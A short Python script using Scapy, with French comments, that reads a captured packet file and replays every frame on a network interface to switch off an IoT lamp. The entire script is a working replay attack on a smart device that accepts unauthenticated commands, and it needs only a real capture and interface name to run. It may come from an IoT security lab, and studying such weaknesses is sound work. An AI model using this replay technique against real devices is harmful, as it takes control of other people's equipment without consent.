from scapy.all import *

# Chargez le paquet capturé (exemple: paquet.pcap) 
packets = rdpcap('paquet_switch_off.pcap')

# Rejoue le paquet en envoyant les trames pour éteindre la lampe
def replay_packet():
    for packet in packets:
        sendp(packet, iface="votre_interface_reseau")

if __name__ == "__main__":
    # Spécifiez l'interface réseau connectée au réseau IoT
    replay_packet()
    print("Paquet rejoué pour éteindre la lampe.")